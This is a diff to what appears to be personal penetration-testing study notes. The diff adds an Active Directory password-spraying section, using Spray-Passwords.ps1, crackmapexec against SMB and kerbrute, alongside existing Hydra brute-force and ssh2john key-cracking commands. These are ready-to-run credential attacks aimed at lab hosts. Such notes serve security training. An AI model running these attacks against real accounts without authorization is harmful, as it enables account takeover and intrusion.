@@ -1,4 +1,4 @@
-### Hydra
+## Hydra
 Principle here is to gather a username by some other enumeration method. If none can be found then be sure to try `Administrator` on Windows and `root` on Linux.
 ```bash
 cd /usr/share/wordlists/rockyou.txt; sudo gzip -d rockyou.txt.gz
@@ -16,6 +16,8 @@ Hitting a page using http basic auth:
 ```bash
 hydra -l admin -P /usr/share/wordlists/rockyou.txt <target IP> http-get
 ```
+
+## Hash Cracking
 
 ### Hashcat
 Standard `hashcat` usage:
@@ -73,3 +75,28 @@ If we have an `id_rsa` file that we've managed to dump via some means (eg. path 
 ssh2john id_rsa > ssh.hash
 ```
 nb. if we want to later log in to the SSH server using the credentials we've just recovered we may need to go ahead and `chmod` the private key file. Try both 600 and 400.
+
+## Active Directory Password Cracking
+
+Back to directly targeting an authentication interface, now in the context of AD. For all of the following it is well worth checking the password policy with `net accounts` in order to be sure that we don't immediately get locked out of every account we hit. All of the following assume that we have obtained a plaintext password by some other means, but don't yet have a matching username.
+
+### Spray-Passwords.ps1
+Querying LDAP and ADSI with user creds. This will need to be run on the target machine, however a benefit of this is that it will enumerate which users to hit for us.
+```powershell
+.\Spray-Passwords.ps1 -Pass 'bigboi123!' -Admin
+```
+```powershell
+.\Spray-Passwords.ps1 -File passwords.txt -Admin
+```
+
+### crackmapexec
+Another approach to password spraying against a Windows machine is available to us courtesy of `crackmapexec`. To target SMB shares with a username list and a known/candidate password (nb. We should take care to check the domain password policy with `net accounts` before we start blasting):
+```bash
+crackmapexec smb 192.168.12.34 -u users.txt -p '123456' -d corp.com --continue-on-success
+```
+
+### kerbrute
+This time our brute forcing is aimed at obtaining a Kerberos Ticket Granting Ticket (TGT):
+```powershell
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "password123"
+```
